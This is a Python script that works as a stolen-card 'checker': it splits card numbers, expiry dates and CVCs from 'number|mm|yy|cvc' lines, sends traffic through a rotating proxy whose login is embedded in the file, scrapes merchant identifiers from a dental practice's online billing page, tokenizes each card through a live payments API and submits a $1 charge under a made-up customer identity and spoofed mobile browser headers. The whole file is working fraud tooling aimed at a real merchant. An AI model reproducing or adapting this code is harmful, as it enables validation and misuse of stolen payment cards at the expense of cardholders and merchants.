import requests, re, random, time
from proxy import reqproxy, make_request

proxies = [
    "brd.superproxy.io:33335:brd-customer-hl_79bd0714-zone-datacenter_proxy1:5aqamf4mqtlv"
]

def get_working_proxy():
	while True:
		proxy_str = random.choice(proxies)
		try:
			session, ip = reqproxy(proxy_str)
			test = session.get("https://httpbin.org/ip", timeout=10)
			if test.status_code == 200:
				print(f"[+] Working proxy : IP: {ip}")
				return session
		except Exception as e:
			print(f"[-] Proxy failed: {proxy_str} - {e}")
			time.sleep(1)  # Avoid hammering proxies too fast

def Tele(ccx):
	session = get_working_proxy()

	ccx = ccx.strip()
	n, mm, yy, cvc = ccx.split("|")
	if "20" in yy:
		yy = yy.split("20")[1]
	if "01" in mm or "02" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
		mm = mm.split("0")[1]

	headers = {
	    'authority': 'app.thebilling.company',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'referer': 'https://www.google.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	response = session.get('https://app.thebilling.company/makdentalgroup-eaton/payment-link', headers=headers)
	
	merchantId = re.search(r'"merchantId":"(.*?)"', response.text).group(1)
	appId = re.search(r'"appId":"(.*?)"', response.text).group(1)
	
	headers = {
	    'authority': 'finix.live-payments-api.com',
	    'accept': 'application/json, text/plain, */*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'origin': 'https://app.thebilling.company',
	    'referer': 'https://app.thebilling.company/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	params = {
	    'merchant_id': f'{merchantId}',
	}
	
	response = session.get('https://finix.live-payments-api.com/fraud/sessions', params=params, headers=headers)
	
	session_id = response.json()['session_id']
	
	headers = {
	    'authority': 'internal.live-payments-api.com',
	    'accept': 'application/json, text/plain, */*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/json',
	    'origin': 'https://js.finix.com',
	    'referer': 'https://js.finix.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'type': 'PAYMENT_CARD',
	    'country': 'USA',
	    'currency': 'USD',
	    'number': f'{n}',
	    'expiration_month': mm,
	    'expiration_year': f'20{yy}',
	    'security_code': f'{cvc}',
	    'address': {
	        'postal_code': '10080',
	        'country': 'USA',
	    },
	}
	
	response = session.post(
	    f'https://internal.live-payments-api.com/applications/{appId}/tokens',
	    headers=headers,
	    json=json_data,
	)
	
	tok = response.json()['id']
	
	headers = {
	    'authority': 'app.thebilling.company',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/json',
	    'origin': 'https://app.thebilling.company',
	    'referer': 'https://app.thebilling.company/makdentalgroup-eaton/payment-link',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	params = {
	    'batch': '1',
	}
	
	json_data = {
	    '0': {
	        'json': {
	            'amount': 1,
	            'firstName': 'Rodam',
	            'lastName': 'User',
	            'dob': '10/03/2001',
	            'email': 'rodamuser08@gmail.com',
	            'phone': '(430)300-0850',
	            'note': '',
	            'officeId': 132,
	            'token': f'{tok}',
	            'sessionId': f'{session_id}',
	        },
	    },
	}
	
	response = session.post(
	    'https://app.thebilling.company/api/trpc/viewer.payments.processOnlinePayment',
	    params=params,
	    headers=headers,
	    json=json_data,
	)
	
	return (response.text)
